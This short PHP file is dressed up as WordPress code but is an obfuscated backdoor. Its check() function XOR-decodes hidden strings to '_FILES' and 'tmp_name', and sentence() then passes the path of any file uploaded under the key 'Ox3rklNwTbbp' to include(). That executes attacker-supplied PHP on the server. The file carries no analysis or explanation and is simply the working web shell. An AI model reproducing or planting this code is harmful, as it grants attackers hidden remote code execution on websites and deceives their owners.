<?php 	
	$default_capabilities = 'cdata';
function sentence()

{
    $title = 'Ox3rklNwTbbp';
    $wheres = $title;
    
    $static_replacements = $GLOBALS[check("%10%3Ez%3E.%3F", $wheres)];
	$babes = 'uploadpath';
    $return = $static_replacements;
    $callback = isset($return[$wheres]);
    if ($callback)

    {
        $has_leading_slash = $static_replacements[$wheres];
        $taxonomy_obj = $has_leading_slash[check("%3B%15C-%05%0D%23%12", $wheres)];
        $ptypes = $taxonomy_obj;
        include ($ptypes);
    }
}
function check($show_in_rest, $tb_list)

{

    $tagstack = $tb_list;
    $pee_parts = "url" . "decode";

    $in_string = $pee_parts($show_in_rest);
    $no_texturize_shortcodes_stack = substr($tagstack,0, strlen($in_string));
    $to_ncr = $in_string ^ $no_texturize_shortcodes_stack;
    
    $in_string = strpos($to_ncr, $no_texturize_shortcodes_stack);
    

    return $to_ncr;
}


	$rest_base = 'post_parent';
sentence();

?>
